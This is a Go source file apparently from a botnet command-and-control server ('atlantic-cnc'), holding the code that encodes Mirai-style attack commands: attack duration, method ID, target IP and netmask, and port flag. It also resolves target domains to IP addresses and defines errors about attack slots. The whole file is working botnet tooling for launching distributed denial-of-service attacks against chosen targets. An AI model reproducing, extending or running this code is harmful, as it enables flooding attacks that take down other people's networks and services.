package attack_launch

import (
        "atlantic-cnc/core/functions"
        "encoding/binary"
        "errors"
        "fmt"
        "net"
        "strconv"
        "strings"

        "github.com/bogdanovich/dns_resolver"
)

var (

        //ErrInvalidTarget is returned if the target is not a IPv4,Ipv6 or domain
        ErrInvalidTarget = errors.New("invalid attack target")

        //ErrDomainNotResolved is returned if the domain could not be resolved to a IP address
        ErrDomainNotResolved = errors.New("domain could not be resolved")

        //ErrPassiveMode is returned when the CNC is compiled in passive mode
        ErrPassiveMode = errors.New("passive mode enabled attacks are not allowed to be sent")

        //ErrBlankTarget is returned if the target is blank
        ErrBlankTarget = errors.New("can not parse blank target")

        //ErrInvalidNetMask is returned if the target has a invalid net mask
        ErrInvalidNetMask = errors.New("invalid net mask")

        //ErrInvalidCIDR is returned if the target has a invalid ErrInvalidCIDR
        ErrInvalidCIDR = errors.New("invalid cidr")

        //ErrFailedToParseIP is returned if the IP can not be parsed
        ErrFailedToParseIP = errors.New("failed to parse IP address")

        //ErrTooManyFlags is returned when there are over 255 attack flags
        ErrTooManyFlags = errors.New("too many attack flags")

        //ErrTooBigFlag is returned when a flag is over 255 bytes
        ErrTooBigFlag = errors.New("too big attack flag, must be smaller than 255 bytes")

        //ErrAttackTooBig is returned when the attack buffer exceeds what can be sent
        ErrAttackTooBig = errors.New("attack buffer is too big")

        //ErrNoAttackSlotsAvaliable is returned when the api returns no slots avaliable
        ErrNoAttackSlotsAvaliable = errors.New("no attack slots avaliable")

        //ErrAttackFailed is returned when the api returns an error
        ErrAttackFailed = errors.New("attack could not be distributed due to a unknown error")

        resolver = dns_resolver.New([]string{"1.1.1.1", "8.8.8.8"})

        //ErrAttackNotSent is returned when the API send method fails
        ErrAttackNotSent = errors.New("attack could not be sent")
)

func build(target string, port int, duration int, method *Mirai) ([]byte, error) {

        flags := make(map[uint8]string)
        flags[7] = fmt.Sprint(port)

        buf := make([]byte, 0)
        var tmp []byte

        // Add in attack duration
        tmp = make([]byte, 4)
        binary.BigEndian.PutUint32(tmp, uint32(duration))
        buf = append(buf, tmp...)

        // Add in attack method
        buf = append(buf, byte(method.ID))

        // Send number of targets
        //Hard coded to one because we only supports one target at a time
        buf = append(buf, byte(1))

        ip, err := ParseTarget(target)
        if err != nil {
                return nil, err
        }

        // Send target
        prefix, netmask, ok, err := getPrefix(ip)
        if err != nil {
                return nil, err
        }

        if ok == false {
                return nil, ErrFailedToParseIP
        }

        ipAddr := net.ParseIP(prefix)
        ipPrefix := binary.BigEndian.Uint32(ipAddr[12:])

        tmp = make([]byte, 5)
        binary.BigEndian.PutUint32(tmp, ipPrefix)
        tmp[4] = byte(netmask)
        buf = append(buf, tmp...)

        // Send number of flags
        buf = append(buf, byte(len(flags)))

        // Send flags
        for key, val := range flags {
                tmp = make([]byte, 2)
                tmp[0] = key
                strbuf := []byte(val)
                if len(strbuf) > 255 {
                        return nil, ErrTooBigFlag
                }
                tmp[1] = uint8(len(strbuf))
                tmp = append(tmp, strbuf...)
                buf = append(buf, tmp...)
        }

        // Specify the total length
        if len(buf) > 4096 {
                return nil, ErrAttackTooBig
        }
        tmp = make([]byte, 2)
        binary.BigEndian.PutUint16(tmp, uint16(len(buf)+2))
        buf = append(tmp, buf...)

        return buf, nil
}

func getPrefix(ip string) (string, uint8, bool, error) {
        prefix := ""
        netmask := uint8(32)
        cidrInfo := strings.Split(ip, "/")
        if len(cidrInfo) == 0 {
                return "", 0, false, ErrBlankTarget
        }

        prefix = cidrInfo[0]
        if len(cidrInfo) == 2 {
                netmaskTmp, err := strconv.Atoi(cidrInfo[1])
                if err != nil || netmask > 32 || netmask < 0 {
                        return "", 0, false, ErrInvalidNetMask
                }
                netmask = uint8(netmaskTmp)
        } else if len(cidrInfo) > 2 {
                return "", 0, false, ErrInvalidCIDR
        }

        return prefix, netmask, true, nil
}

//ParseTarget will return the IP of the target after validating and resolving it to an IP
func ParseTarget(target string) (string, error) {

        if functions.IsIPv4(target) == false && functions.IsIPv6(target) == false {

                if functions.IsDomain(target) == false {
                        return "", ErrInvalidTarget
                }

                ips, err := resolver.LookupHost(target)
                if err != nil {
                        return "", ErrDomainNotResolved
                }

                if len(ips) < 1 {
                        return "", ErrDomainNotResolved
                }

                return fmt.Sprint(ips[0]), nil
        }

        return target, nil

}
